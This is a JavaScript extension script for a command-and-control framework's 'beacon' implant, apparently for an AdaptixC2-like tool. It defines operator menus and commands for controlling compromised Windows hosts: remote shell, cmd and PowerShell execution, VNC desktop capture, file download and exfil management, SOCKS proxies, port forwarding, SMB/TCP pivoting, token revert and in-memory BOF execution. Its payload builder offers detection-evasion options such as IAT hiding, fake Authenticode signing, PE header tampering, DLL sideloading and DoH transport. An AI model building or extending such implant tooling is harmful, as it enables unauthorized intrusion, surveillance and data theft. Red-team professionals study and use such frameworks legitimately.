/// Beacon agent

let vnc_start_action = menu.create_action("Start VNC Session", function(agents) {
    agents.forEach(function(agent) {
        let label_target_port = form.create_label("Target Port (on agent):");
        let spin_target_port = form.create_spin();
        spin_target_port.setRange(1024, 65535);
        spin_target_port.setValue(40484);
        let label_local_port = form.create_label("Local Port (on C2):");
        let spin_local_port = form.create_spin();
        spin_local_port.setRange(1024, 65535);
        spin_local_port.setValue(41484);
        let layout = form.create_gridlayout();
        layout.addWidget(label_target_port, 0, 0, 1, 1);
        layout.addWidget(spin_target_port, 0, 1, 1, 1);
        layout.addWidget(label_local_port, 1, 0, 1, 1);
        layout.addWidget(spin_local_port, 1, 1, 1, 1);
        let dialog = form.create_dialog("Start VNC Session");
        dialog.setSize(400, 120);
        dialog.setLayout(layout);
        if (dialog.exec() == true) {
            ax.execute_command(agent, "vnc start " + spin_target_port.value() + " " + spin_local_port.value());
        }
    });
});
let vnc_view_action = menu.create_action("View Desktop", function(agents) { agents.forEach(v => ax.execute_command(v, "vnc view")) });
let vnc_stop_action = menu.create_action("Stop VNC Session", function(agents) {
    agents.forEach(function(agent) {
        let port_label = form.create_label("Local Port:");
        let port_spin = form.create_spin();
        port_spin.setRange(1024, 65535);
        port_spin.setValue(41484);
        let layout = form.create_gridlayout();
        layout.addWidget(port_label, 0, 0, 1, 1);
        layout.addWidget(port_spin, 0, 1, 1, 1);
        let dialog = form.create_dialog("Stop VNC Session");
        dialog.setSize(300, 90);
        dialog.setLayout(layout);
        if (dialog.exec() == true) {
            ax.execute_command(agent, "vnc stop " + port_spin.value());
        }
    });
});
let vnc_menu = menu.create_menu("VNC Desktop");
vnc_menu.addItem(vnc_start_action);
vnc_menu.addItem(vnc_view_action);
vnc_menu.addItem(vnc_stop_action);
menu.add_session_agent(vnc_menu, ["beacon"]);

let exit_thread_action  = menu.create_action("Terminate thread",  function(value) { value.forEach(v => ax.execute_command(v, "terminate thread")) });
let exit_process_action = menu.create_action("Terminate process", function(value) { value.forEach(v => ax.execute_command(v, "terminate process")) });
let exit_menu = menu.create_menu("Exit");
exit_menu.addItem(exit_thread_action)
exit_menu.addItem(exit_process_action)
menu.add_session_agent(exit_menu, ["beacon"])


let file_browser_action    = menu.create_action("File Browser",    function(value) { value.forEach(v => ax.open_browser_files(v)) });
let process_browser_action = menu.create_action("Process Browser", function(value) { value.forEach(v => ax.open_browser_process(v)) });
let shell_browser_action   = menu.create_action("Remote Shell",    function(value) { value.forEach(v => ax.open_remote_shell(v)) });
menu.add_session_browser(file_browser_action, ["beacon"])
menu.add_session_browser(process_browser_action, ["beacon"])
menu.add_session_browser(shell_browser_action, ["beacon"])


let tunnel_access_action = menu.create_action("Create Tunnel", function(value) { ax.open_access_tunnel(value[0], true, true, true, true) });
menu.add_session_access(tunnel_access_action, ["beacon"])


let execute_action = menu.create_action("Execute", function(files_list) {
    file = files_list[0];
    if(file.type != "file"){ return; }

    let label_bin = form.create_label("Binary:");
    let text_bin = form.create_textline(file.path + file.name);
    text_bin.setEnabled(false);
    let label_args = form.create_label("Arguments:");
    let text_args = form.create_textline();
    let output_check = form.create_check("Show command output");
    output_check.setChecked(true);

    let layout = form.create_gridlayout();
    layout.addWidget(label_bin, 0, 0, 1, 1);
    layout.addWidget(text_bin, 0, 1, 1, 1);
    layout.addWidget(label_args, 1, 0, 1, 1);
    layout.addWidget(text_args, 1, 1, 1, 1);
    layout.addWidget(output_check, 2, 1, 1, 1);

    let dialog = form.create_dialog("Execute binary");
    dialog.setSize(600, 100);
    dialog.setLayout(layout);
    if ( dialog.exec() == true )
    {
        let command = "ps run ";
        if( output_check.isChecked()) { command += "-o "; }
        command += text_bin.text() + " " + text_args.text();

        ax.execute_command(file.agent_id, command);
    }
});
let download_action = menu.create_action("Download", function(files_list) {
    files_list.forEach((file) => {
        if(file.type == "file") {
            ax.execute_command(file.agent_id, "download " + file.path + file.name);
        }
    });
});
let remove_action = menu.create_action("Remove", function(files_list) {
    files_list.forEach(file => ax.execute_command(file.agent_id, "rm " + file.path + file.name))
});
menu.add_filebrowser(execute_action, ["beacon"])
menu.add_filebrowser(download_action, ["beacon"])
menu.add_filebrowser(remove_action, ["beacon"])




let download_stop_action = menu.create_action("Pause", function(files_list) { files_list.forEach( file => ax.execute_command(file.agent_id, "exfil stop " + file.file_id) ) });
let download_start_action = menu.create_action("Resume", function(files_list) { files_list.forEach( file => ax.execute_command(file.agent_id, "exfil start " + file.file_id) ) });
let download_separator1 = menu.create_separator()
let download_cancel_action = menu.create_action("Cancel", function(files_list) { files_list.forEach( file => ax.execute_command(file.agent_id, "exfil cancel " + file.file_id) ) });
menu.add_downloads_running(download_stop_action, ["beacon"])
menu.add_downloads_running(download_start_action, ["beacon"])
menu.add_downloads_running(download_separator1, ["beacon"])
menu.add_downloads_running(download_cancel_action, ["beacon"])


let job_stop_action = menu.create_action("Stop job", function(tasks_list) {
    tasks_list.forEach((task) => {
        if(task.type == "JOB" && task.state == "Running") {
            ax.execute_command(task.agent_id, "jobs kill " + task.task_id);
        }
    });
});
menu.add_tasks_job(job_stop_action, ["beacon"])


var event_disks_action = function(id) {
    ax.execute_browser(id, "disks");
}
event.on_filebrowser_disks(event_disks_action, ["beacon"]);

var event_files_action = function(id, path) {
    ax.execute_browser(id, "ls " + path);
}
event.on_filebrowser_list(event_files_action, ["beacon"]);

var event_upload_action = function(id, path, filepath) {
    let filename = ax.file_basename(filepath);
    ax.execute_browser(id, "upload " + filepath + " " + path + filename);
}
event.on_filebrowser_upload(event_upload_action, ["beacon"]);

var event_process_action = function(id) {
    ax.execute_browser(id, "ps list");
}
event.on_processbrowser_list(event_process_action, ["beacon"]);


function RegisterCommands(listenerType)
{
    let cmd_cat = ax.create_command("cat", "Read the full content of the specified file (max 16MB; use download for larger)", "cat C:\\file.txt", "Task: read file");
    cmd_cat.addArgString("path", true);

    let cmd_cd = ax.create_command("cd", "Change current working directory", "cd C:\\Windows", "Task: change working directory");
    cmd_cd.addArgString("path", true);

    let cmd_cp = ax.create_command("cp", "Copy file", "cp src.txt dst.txt", "Task: copy file");
    cmd_cp.addArgString("src", true);
    cmd_cp.addArgString("dst", true);

    let cmd_disks = ax.create_command("disks", "Lists mounted drives on current system", "disks", "Task: show mounted disks");

    let cmd_download = ax.create_command("download", "Download a file", "download C:\\Temp\\file.txt", "Task: download file");
    cmd_download.addArgString("file", true);

    let _cmd_execute_bof = ax.create_command("bof", "Execute Beacon Object File", "execute bof /home/user/whoami.o", "Task: execute BOF");
    _cmd_execute_bof.addArgBool("-a", "Async mode");
    _cmd_execute_bof.addArgFile("bof", true, "Path to object file");
    _cmd_execute_bof.addArgString("param_data", false);
    let cmd_execute = ax.create_command("execute", "Execute [bof] in the current process's memory");
    cmd_execute.addSubCommands([_cmd_execute_bof])

    let _cmd_exfil_cancel = ax.create_command("cancel", "Cancels a download", "exfil cancel 1a2b3c4d");
    _cmd_exfil_cancel.addArgString("file_id", true);
    let _cmd_exfil_start = ax.create_command("start", "Resumes a download that's has been stoped", "exfil start 1a2b3c4d");
    _cmd_exfil_start.addArgString("file_id", true);
    let _cmd_exfil_stop = ax.create_command("stop", "Stops a download that's in-progress", "exfil stop 1a2b3c4d");
    _cmd_exfil_stop.addArgString("file_id", true);
    let cmd_exfil = ax.create_command("exfil", "Manage current downloads");
    cmd_exfil.addSubCommands([_cmd_exfil_cancel, _cmd_exfil_start, _cmd_exfil_stop])

    let cmd_getuid = ax.create_command("getuid", "Prints the User ID associated with the current token", "getuid", "Task: get username of current token");

    let _cmd_job_list = ax.create_command("list", "List of jobs", "jobs list", "Task: show jobs");
    let _cmd_job_kill = ax.create_command("kill", "Kill a specified job", "jobs kill 1a2b3c4d", "Task: kill job");
    _cmd_job_kill.addArgString("task_id", true);
    let cmd_job = ax.create_command("jobs", "Long-running tasks manager");
    cmd_job.addSubCommands([_cmd_job_list, _cmd_job_kill]);

    let _cmd_link_smb = ax.create_command("smb", "Connect to an SMB agent and re-establish control of it", "link smb 192.168.1.2 pipe_a1b2", "Task: Connect to an SMB agent");
    _cmd_link_smb.addArgString("target", true);
    _cmd_link_smb.addArgString("pipename", true);
    let _cmd_link_tcp = ax.create_command("tcp", "Connect to an TCP agent and re-establish control of it", "link tcp 192.168.1.2 8888", "Task: Connect to an TCP agent");
    _cmd_link_tcp.addArgString("target", true);
    _cmd_link_tcp.addArgInt("port", true);
    let cmd_link = ax.create_command("link", "Connect to an pivot agents");
    cmd_link.addSubCommands([_cmd_link_smb, _cmd_link_tcp]);

    let cmd_ls = ax.create_command("ls", "List contents of a directory or details of a file", "ls C:\\Windows", "Task: list files");
    cmd_ls.addArgString("path", "", ".");

    let _cmd_lportfwd_start = ax.create_command("start", "Start local port forwarding from server via agent", "lportfwd start 127.0.0.1 8080 192.168.1.1 8080");
    _cmd_lportfwd_start.addArgString("lhost", "Listening interface address on server", "0.0.0.0");
    _cmd_lportfwd_start.addArgInt("lport", true, "Listen port on server");
    _cmd_lportfwd_start.addArgString("fwdhost", true, "Remote forwarding address");
    _cmd_lportfwd_start.addArgInt("fwdport", true, "Remote forwarding port");
    let _cmd_lportfwd_stop = ax.create_command("stop", "Stop local port forwarding", "lportfwd stop 8080");
    _cmd_lportfwd_stop.addArgInt("lport", true);
    let cmd_lportfwd = ax.create_command("lportfwd", "Managing local port forwarding");
    cmd_lportfwd.addSubCommands([_cmd_lportfwd_start, _cmd_lportfwd_stop]);

    let cmd_mv = ax.create_command("mv", "Move file", "mv src.txt dst.txt", "Task: move file");
    cmd_mv.addArgString("src", true);
    cmd_mv.addArgString("dst", true);

    let cmd_mkdir = ax.create_command("mkdir", "Make a directory", "mkdir C:\\Temp", "Task: make directory");
    cmd_mkdir.addArgString("path", true);

    let _cmd_profile_chunksize = ax.create_command("download.chunksize", "Change the exfiltrate data size for download request (default 128000)", "profile download.chunksize 512000", "Task: set download chunk size");
    _cmd_profile_chunksize.addArgInt("size", true);
    let _cmd_profile_killdate = ax.create_command("killdate", "Set the date and time for the beacon to stop working", "profile killdate 28.02.2030 12:34:00", "Task: set beacon's killdate");
    _cmd_profile_killdate.addArgString("datetime", true, "Datetime 'DD.MM.YYYY hh:mm:ss' in GMT format. Set 0 to disable the option");
    let _cmd_profile_workingtime = ax.create_command("workingtime", "Set the start and end time of the beacon activity", "profile workingtime 8:00-17:30", "Task: set beacon's workingtime");
    _cmd_profile_workingtime.addArgString("time", true, "Time interval in the format 'HH:mm(start)-HH:mm(end)'. Set 0 to disable the option");
    let cmd_profile = ax.create_command("profile", "Configure the payloads profile for current session");
    cmd_profile.addSubCommands([_cmd_profile_chunksize, _cmd_profile_killdate, _cmd_profile_workingtime]);

    let _cmd_ps_list = ax.create_command("list", "Show process list", "ps list", "Task: show process list");
    let _cmd_ps_kill = ax.create_command("kill", "Kill a process with a given PID", "ps kill 7865", "Task: kill process");
    _cmd_ps_kill.addArgInt("pid", true);
    let _cmd_ps_run = ax.create_command("run", "Run a program", "run -s cmd.exe /c whoami /all", "Task: create new process");
    _cmd_ps_run.addArgBool("-s", "Suspend process");
    _cmd_ps_run.addArgBool("-o", "Output to console");
    _cmd_ps_run.addArgBool("-i", "Use impersonation");
    _cmd_ps_run.addArgString("args", true);
    let cmd_ps = ax.create_command("ps", "Process manager");
    cmd_ps.addSubCommands([_cmd_ps_list, _cmd_ps_kill, _cmd_ps_run]);

    let cmd_pwd = ax.create_command("pwd", "Print current working directory", "pwd", "Task: print working directory");

    let cmd_rev2self = ax.create_command("rev2self", "Revert to your original access token", "rev2self", "Task: revert token");

    let cmd_rm = ax.create_command("rm", "Remove a file or folder", "rm C:\\Temp\\file.txt", "Task: remove file or directory");
    cmd_rm.addArgString("path", true);

    let _cmd_rportfwd_start = ax.create_command("start", "Start remote port forwarding from agent via server", "rportfwd start 8080 10.10.10.14 8080");
    _cmd_rportfwd_start.addArgInt("lport", true, "Listen port on agent");
    _cmd_rportfwd_start.addArgString("fwdhost", true, "Remote forwarding address");
    _cmd_rportfwd_start.addArgInt("fwdport", true, "Remote forwarding port");
    let _cmd_rportfwd_stop = ax.create_command("stop", "Stop remote port forwarding", "rportfwd stop 8080");
    _cmd_rportfwd_stop.addArgInt("lport", true);
    let cmd_rportfwd = ax.create_command("rportfwd", "Managing remote port forwarding");
    cmd_rportfwd.addSubCommands([_cmd_rportfwd_start, _cmd_rportfwd_stop]);

    let cmd_sleep = ax.create_command("sleep", "Sets sleep time", "sleep 30m5s 10");
    cmd_sleep.addArgString("sleep", true, "Time in '%h%m%s' format or number of seconds");
    cmd_sleep.addArgInt("jitter", false, "Max random amount of time in % added to sleep");

    let _cmd_burst_show = ax.create_command("show", "Show burst config", "burst show");
    let _cmd_burst_set = ax.create_command("set", "Set burst config", "burst set 1 50 10");
    _cmd_burst_set.addArgInt("enabled", true, "1=on, 0=off");
    _cmd_burst_set.addArgInt("sleep", false, "Sleep in ms (default 50)");
    _cmd_burst_set.addArgInt("jitter", false, "Jitter % 0-90 (default 0)");
    let cmd_burst = ax.create_command("burst", "DNS burst mode");
    cmd_burst.addSubCommands([_cmd_burst_show, _cmd_burst_set]);

    let _cmd_socks_start = ax.create_command("start", "Start a SOCKS(4a/5) proxy server and listen on a specified port", "socks start 1080 -auth user pass");
    _cmd_socks_start.addArgFlagString("-h", "address", "Listening interface address", "0.0.0.0");
    _cmd_socks_start.addArgInt("port", true, "Listen port");
    _cmd_socks_start.addArgBool("-socks4", "Use SOCKS4 proxy (Default SOCKS5)");
    _cmd_socks_start.addArgBool("-auth", "Enable User/Password authentication for SOCKS5");
    _cmd_socks_start.addArgString("username", false, "Username for SOCKS5 proxy");
    _cmd_socks_start.addArgString("password", false, "Password for SOCKS5 proxy");
    let _cmd_socks_stop = ax.create_command("stop", "Stop a SOCKS proxy server", "socks stop 1080");
    _cmd_socks_stop.addArgInt("port", true);
    let cmd_socks = ax.create_command("socks", "Managing socks tunnels");
    cmd_socks.addSubCommands([_cmd_socks_start, _cmd_socks_stop]);

    let _cmd_terminate_thread = ax.create_command("thread", "Terminate the main beacon thread (without terminating the process)", "terminate thread", "Task: terminate agent thread");
    let _cmd_terminate_process = ax.create_command("process", "Terminate the beacon process", "terminate process", "Task: terminate agent process");
    let cmd_terminate = ax.create_command("terminate", "Terminate the session");
    cmd_terminate.addSubCommands([_cmd_terminate_thread, _cmd_terminate_process]);

    let cmd_unlink = ax.create_command("unlink", "Disconnect from an pivot agent", "unlink 1a2b3c4d", "Task: disconnect from an pivot agent");
    cmd_unlink.addArgString("id", true);

    let cmd_upload = ax.create_command("upload", "Upload a file", "upload /tmp/file.txt C:\\Temp\\file.txt", "Task: upload file");
    cmd_upload.addArgFile("local_file", true);
    cmd_upload.addArgString("remote_path", false);

    /// Aliases

    let cmd_shell = ax.create_command("shell", "Execute command via cmd.exe", "shell whoami /all");
    cmd_shell.addArgString("cmd_params", true);
    cmd_shell.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
        let new_cmd = "ps run -o C:\\Windows\\System32\\cmd.exe /c " + parsed_json["cmd_params"];
        ax.execute_alias(id, cmdline, new_cmd);
    });

    let cmd_powershell = ax.create_command("powershell", "Execute command via powershell.exe", "powershell ls");
    cmd_powershell.addArgString("cmd_params", true);
    cmd_powershell.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
        let new_cmd = "ps run -o C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -c " + parsed_json["cmd_params"];
        ax.execute_alias(id, cmdline, new_cmd);
    });

    let cmd_interact = ax.create_command("interact", "Set 'sleep 0'", "interact");
    cmd_interact.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
        ax.execute_alias(id, cmdline, "sleep 0");
    });

    let _cmd_vnc_start = ax.create_command("start", "Start a VNC desktop streaming session", "vnc start 40484 41484", "Task: start VNC session");
    _cmd_vnc_start.addArgInt("target_port", true, "Listen port on agent");
    _cmd_vnc_start.addArgInt("local_port", true, "Listen port on teamserver");
    let _cmd_vnc_stop = ax.create_command("stop", "Stop a VNC desktop streaming session", "vnc stop 41484", "Task: stop VNC session");
    _cmd_vnc_stop.addArgInt("local_port", true, "Listen port on teamserver");
    let _cmd_vnc_view = ax.create_command("view", "Show the VNC viewer URL", "vnc view", "Task: show VNC viewer");
    let _cmd_vnc_list = ax.create_command("list", "List active VNC sessions", "vnc list", "Task: list VNC sessions");
    let cmd_vnc = ax.create_command("vnc", "VNC remote desktop sessions");
    cmd_vnc.addSubCommands([_cmd_vnc_start, _cmd_vnc_stop, _cmd_vnc_view, _cmd_vnc_list]);

    if(listenerType == "BeaconDNS") {
        let commands_dns = ax.create_commands_group("beacon", [cmd_cat, cmd_cd, cmd_cp, cmd_disks, cmd_download, cmd_execute, cmd_exfil, cmd_getuid,
            cmd_job, cmd_link, cmd_ls, cmd_lportfwd, cmd_mv, cmd_mkdir, cmd_profile, cmd_ps, cmd_pwd, cmd_rev2self, cmd_rm, cmd_rportfwd, cmd_sleep,
            cmd_socks, cmd_terminate, cmd_unlink, cmd_upload, cmd_shell, cmd_powershell, cmd_interact, cmd_vnc, cmd_burst] );
        return { commands_windows: commands_dns }
    }
    /* ★ BeaconWS 必须与 BeaconHTTP 同组，不能落到下面的 else。
       它原先是掉进最后那句 `return ax.create_commands_group("none",[])` 的：
       WS 监听器一切正常、agent 也上得了线，但该 agent 的内置命令集是**空的** ——
       连 `execute` 都没有。于是控制台里敲任何命令都报
           command 'execute' not found for agent 'beacon' os=1
       而 Extension-Kit 的 62 条 BOF 命令全部靠 preHook 展开成 `execute bof ...`，
       在 WS beacon 上就一条都用不了（实测于 154，agent 4efca70d）。
       归到 HTTP 组的依据是传输语义而非猜测：Agent.cpp:118 的 beat 构造、
       AgentConfig.cpp:30、config.cpp:16、AgentConfig.h:86 都把
       BEACON_WS 与 BEACON_HTTP/BEACON_DNS 列在同一 #if 分支，
       与 BEACON_SMB/TCP 那组（内部 P2P、不睡眠）相反 ⇒ 命令集也该带 cmd_sleep。 */
    else if(listenerType == "BeaconHTTP" || listenerType == "BeaconWS") {
        let commands_http = ax.create_commands_group("beacon", [cmd_cat, cmd_cd, cmd_cp, cmd_disks, cmd_download, cmd_execute, cmd_exfil, cmd_getuid,
            cmd_job, cmd_link, cmd_ls, cmd_lportfwd, cmd_mv, cmd_mkdir, cmd_profile, cmd_ps, cmd_pwd, cmd_rev2self, cmd_rm, cmd_rportfwd, cmd_sleep,
            cmd_socks, cmd_terminate, cmd_unlink, cmd_upload, cmd_shell, cmd_powershell, cmd_interact, cmd_vnc] );

        return { commands_windows: commands_http }
    }
    else if (listenerType == "BeaconSMB" || listenerType == "BeaconTCP") {
        let commands_internal = ax.create_commands_group("beacon", [cmd_cat, cmd_cd, cmd_cp, cmd_disks, cmd_download, cmd_execute, cmd_exfil, cmd_getuid,
            cmd_job, cmd_link, cmd_ls, cmd_lportfwd, cmd_mv, cmd_mkdir, cmd_profile, cmd_ps, cmd_pwd, cmd_rev2self, cmd_rm, cmd_rportfwd,
            cmd_socks, cmd_terminate, cmd_unlink, cmd_upload, cmd_shell, cmd_powershell, cmd_interact, cmd_vnc] );

        return { commands_windows: commands_internal }
    }

    return ax.create_commands_group("none",[]);
}

function GenerateUI(listeners_type)
{
    let spacer1 = form.create_vspacer();

    let labelArch = form.create_label("Arch:");
    let comboArch = form.create_combo()
    comboArch.addItems(["x64", "x86"]);

    let labelAgentFormat = form.create_label("Format:");
    let comboAgentFormat = form.create_combo()
    // 与 Web 的 BuildSchema 对齐：只留 Exe / Stager
    comboAgentFormat.addItems(["Exe", "Stager"]);

    let labelSleep = form.create_label("Sleep (Jitter %):");
    let textSleep = form.create_textline("4s");
    textSleep.setPlaceholder("1h 2m 5s")
    let spinJitter = form.create_spin();
    spinJitter.setRange(0, 100);
    spinJitter.setValue(0);

    if( !listeners_type.includes("BeaconHTTP") && !listeners_type.includes("BeaconDNS") ) {
        labelSleep.setVisible(false);
        textSleep.setVisible(false);
        spinJitter.setVisible(false);
    }

    let checkKilldate = form.create_check("Set 'killdate'");
    let dateKill = form.create_dateline("dd.MM.yyyy");
    let timeKill = form.create_timeline("HH:mm:ss");

    let checkWorkingTime = form.create_check("Set 'workingtime'");
    let timeStart = form.create_timeline("HH:mm");
    let timeFinish = form.create_timeline("HH:mm");

    let labelSvcName = form.create_label("Service Name:");
    labelSvcName.setVisible(false)
    let textSvcName = form.create_textline("AgentService");
    textSvcName.setVisible(false);

    let checkSideloading = form.create_check("Legit-DLL:");
    checkSideloading.setVisible(false);
    let sideloadingSelector = form.create_selector_file();
    sideloadingSelector.setVisible(false);

    let checkIatHiding = form.create_check("IAT Hiding (no CRT, empty import table)");
    checkIatHiding.setChecked(true);
    // if( !listeners_type.includes("BeaconHTTP") && !listeners_type.includes("BeaconDNS") ) {
    //     checkIatHiding.setVisible(false);
    // }

    let labelIcon = form.create_label("Icon:");
    let checkIconRandom = form.create_check("Random ICO");
    let iconSelector = form.create_selector_file();

    let checkExePseudoSign = form.create_check("Exe pseudo Authenticode (random self-signed, TS: openssl+osslsigncode)");
    // Default ON, matching the web console (listeners.ts:284 / Generate.tsx:168 send true for
    // Exe / Service Exe). The teamserver now ACTUALLY reads this value (pl_main.go): before, it was
    // declared but never read, so the checkbox was inert. Leaving the default unset would let the Qt
    // default decide -- if that is unchecked, Qt-built EXEs would silently go from "always signed" to
    // "unsigned". Explicit true keeps the observable behaviour identical to before.
    // NOTE: checked != mandatory. If the teamserver lacks openssl/osslsigncode, signing is skipped
    // with a build-log line and the payload is still produced.
    checkExePseudoSign.setChecked(true);
    checkExePseudoSign.setVisible(false);

    let checkPeHeaderMod = form.create_check("PE header mod (Rich header + timestamp + checksum)");
    checkPeHeaderMod.setChecked(true);

    //////////////////// DNS Settings

    let labelDnsMode = form.create_label("DNS Mode:");
    let comboDnsMode = form.create_combo();
    comboDnsMode.addItems(["DNS (Direct UDP)", "DoH (DNS over HTTPS)", "DNS -> DoH fallback", "DoH -> DNS fallback"]);
    comboDnsMode.setCurrentIndex(0);

    let labelDnsResolvers = form.create_label("DNS Resolvers:");
    let textDnsResolvers = form.create_textline("8.8.8.8,1.1.1.1,9.9.9.9");

    let labelDohResolvers = form.create_label("DoH Resolvers:");
    let textDohResolvers = form.create_textline("https://dns.google/dns-query,https://cloudflare-dns.com/dns-query,https://dns.quad9.net/dns-query");

    let labelUserAgent = form.create_label("User-Agent:");
    let textUserAgent = form.create_textline("Mozilla/5.0 (Windows NT 6.2; rv:20.0) Gecko/20121202 Firefox/20.0");

    let layout_group_dns = form.create_gridlayout();
    layout_group_dns.addWidget(labelDnsMode,      0, 0, 1, 1);
    layout_group_dns.addWidget(comboDnsMode,      0, 1, 1, 1);
    layout_group_dns.addWidget(labelDnsResolvers, 1, 0, 1, 1);
    layout_group_dns.addWidget(textDnsResolvers,  1, 1, 1, 1);
    layout_group_dns.addWidget(labelDohResolvers, 2, 0, 1, 1);
    layout_group_dns.addWidget(textDohResolvers,  2, 1, 1, 1);
    layout_group_dns.addWidget(labelUserAgent,    3, 0, 1, 1);
    layout_group_dns.addWidget(textUserAgent,     3, 1, 1, 1);

    let panel_group_dns = form.create_panel();
    panel_group_dns.setLayout(layout_group_dns);
    let group_dns = form.create_groupbox("DNS settings")
    group_dns.setPanel(panel_group_dns);

    function updateDnsFieldsVisibility() {
        let mode = comboDnsMode.currentText();
        if(mode == "DNS (Direct UDP)") {
            labelDnsResolvers.setVisible(true);
            textDnsResolvers.setVisible(true);
            labelDohResolvers.setVisible(false);
            textDohResolvers.setVisible(false);
            labelUserAgent.setVisible(false);
            textUserAgent.setVisible(false);
        } else if(mode == "DoH (DNS over HTTPS)") {
            labelDnsResolvers.setVisible(false);
            textDnsResolvers.setVisible(false);
            labelDohResolvers.setVisible(true);
            textDohResolvers.setVisible(true);
            labelUserAgent.setVisible(true);
            textUserAgent.setVisible(true);
        } else {
            labelDnsResolvers.setVisible(true);
            textDnsResolvers.setVisible(true);
            labelDohResolvers.setVisible(true);
            textDohResolvers.setVisible(true);
            labelUserAgent.setVisible(true);
            textUserAgent.setVisible(true);
        }
    }

    updateDnsFieldsVisibility();
    form.connect(comboDnsMode, "currentTextChanged", function(text) {
        updateDnsFieldsVisibility();
    });

    //////////////////// HTTP Settings

    let labelProxyType = form.create_label("Type:");
    let comboProxyType = form.create_combo();
    comboProxyType.addItems(["http", "https"]);

    let labelProxyServer = form.create_label("Server:");
    let textProxyServer = form.create_textline("");
    textProxyServer.setPlaceholder("192.168.1.1");
    let spinProxyPort = form.create_spin();
    spinProxyPort.setRange(1, 65535);
    spinProxyPort.setValue(3128);

    let labelProxyUsername = form.create_label("Username:");
    let textProxyUsername = form.create_textline("");
    textProxyUsername.setPlaceholder("(optional)");

    let labelProxyPassword = form.create_label("Password:");
    let textProxyPassword = form.create_textline("");
    textProxyPassword.setPlaceholder("(optional)");

    let layout_group_proxy = form.create_gridlayout();
    layout_group_proxy.addWidget(labelProxyType,     0, 0, 1, 1);
    layout_group_proxy.addWidget(comboProxyType,     0, 1, 1, 2);
    layout_group_proxy.addWidget(labelProxyServer,   1, 0, 1, 1);
    layout_group_proxy.addWidget(textProxyServer,    1, 1, 1, 1);
    layout_group_proxy.addWidget(spinProxyPort,      1, 2, 1, 1);
    layout_group_proxy.addWidget(labelProxyUsername, 2, 0, 1, 1);
    layout_group_proxy.addWidget(textProxyUsername,  2, 1, 1, 2);
    layout_group_proxy.addWidget(labelProxyPassword, 3, 0, 1, 1);
    layout_group_proxy.addWidget(textProxyPassword,  3, 1, 1, 2);

    let panel_group_proxy = form.create_panel();
    panel_group_proxy.setLayout(layout_group_proxy);
    let group_proxy = form.create_groupbox("Use HTTP/HTTPS proxy", true)
    group_proxy.setPanel(panel_group_proxy);
    group_proxy.setChecked(false);

    /////////////////////////

    let labelRotation = form.create_label("Rotation Mode:");
    let comboRotation = form.create_combo();
    comboRotation.addItems(["sequential", "random"]);

    let spacer2 = form.create_vspacer();

    if(!listeners_type.includes("BeaconDNS")) {
        group_dns.setVisible(false);
    }
    if(!listeners_type.includes("BeaconHTTP")) {
        group_proxy.setVisible(false);
        labelRotation.setVisible(false);
        comboRotation.setVisible(false);
    }

    let layout = form.create_gridlayout();
    layout.addWidget(spacer1,             0, 0, 1, 3);
    layout.addWidget(labelArch,           1, 0, 1, 1);
    layout.addWidget(comboArch,           1, 1, 1, 2);
    layout.addWidget(labelAgentFormat,    2, 0, 1, 1);
    layout.addWidget(comboAgentFormat,    2, 1, 1, 2);
    layout.addWidget(labelSleep,          3, 0, 1, 1);
    layout.addWidget(textSleep,           3, 1, 1, 1);
    layout.addWidget(spinJitter,          3, 2, 1, 1);
    layout.addWidget(checkKilldate,       4, 0, 1, 1);
    layout.addWidget(dateKill,            4, 1, 1, 1);
    layout.addWidget(timeKill,            4, 2, 1, 1);
    layout.addWidget(checkWorkingTime,    5, 0, 1, 1);
    layout.addWidget(timeStart,           5, 1, 1, 1);
    layout.addWidget(timeFinish,          5, 2, 1, 1);
    layout.addWidget(labelSvcName,        6, 0, 1, 1);
    layout.addWidget(textSvcName,         6, 1, 1, 2);
    layout.addWidget(checkSideloading,    7, 0, 1, 1);
    layout.addWidget(sideloadingSelector, 7, 1, 1, 2);
    layout.addWidget(labelRotation,       8, 0, 1, 1);
    layout.addWidget(comboRotation,       8, 1, 1, 2);
    layout.addWidget(labelIcon,           9, 0, 1, 1);
    layout.addWidget(checkIconRandom,     9, 1, 1, 1);
    layout.addWidget(iconSelector,        9, 2, 1, 1);
    layout.addWidget(checkExePseudoSign,  10, 0, 1, 3);
    layout.addWidget(checkPeHeaderMod,    11, 0, 1, 3);
    layout.addWidget(checkIatHiding,      12, 0, 1, 3);
    layout.addWidget(group_proxy,        13, 0, 1, 3);
    layout.addWidget(group_dns,          14, 0, 1, 3);
    layout.addWidget(spacer2,            15, 0, 1, 3);

    function updateIconFileVisibility() {
        let pe = (comboAgentFormat.currentText() == "Exe" || comboAgentFormat.currentText() == "Service Exe" || comboAgentFormat.currentText() == "DLL");
        if(!pe) return;
        iconSelector.setVisible(!checkIconRandom.isChecked());
    }

    function updateIconRowVisibility(fmt) {
        let pe = (fmt == "Exe" || fmt == "Service Exe" || fmt == "DLL");
        labelIcon.setVisible(pe);
        checkIconRandom.setVisible(pe);
        if(pe) {
            updateIconFileVisibility();
        } else {
            iconSelector.setVisible(false);
        }
    }

    form.connect(comboAgentFormat, "currentTextChanged", function(text) {
        if(text == "Service Exe") {
            labelSvcName.setVisible(true)
            textSvcName.setVisible(true);
        } else {
            labelSvcName.setVisible(false)
            textSvcName.setVisible(false);
        }
        if(text == "DLL") {
            checkSideloading.setVisible(true);
            sideloadingSelector.setVisible(true);
        } else {
            checkSideloading.setVisible(false)
            sideloadingSelector.setVisible(false);
        }
        updateIconRowVisibility(text);
        updateExePseudoSignVisibility(text);
        updatePeHeaderModVisibility(text);
    });
    form.connect(checkIconRandom, "stateChanged", function() {
        updateIconFileVisibility();
    });
    function updateExePseudoSignVisibility(fmt) {
        checkExePseudoSign.setVisible(fmt == "Exe" || fmt == "Service Exe");
    }
    function updatePeHeaderModVisibility(fmt) {
        checkPeHeaderMod.setVisible(fmt == "Exe" || fmt == "Service Exe" || fmt == "DLL");
    }
    updateIconRowVisibility(comboAgentFormat.currentText());
    updateExePseudoSignVisibility(comboAgentFormat.currentText());
    updatePeHeaderModVisibility(comboAgentFormat.currentText());

    let container = form.create_container()
    container.put("arch",                comboArch)
    container.put("format",              comboAgentFormat)
    container.put("sleep",               textSleep)
    container.put("jitter",              spinJitter)
    container.put("dns_resolvers",       textDnsResolvers)
    container.put("dns_mode",            comboDnsMode)
    container.put("doh_resolvers",       textDohResolvers)
    container.put("user_agent",          textUserAgent)
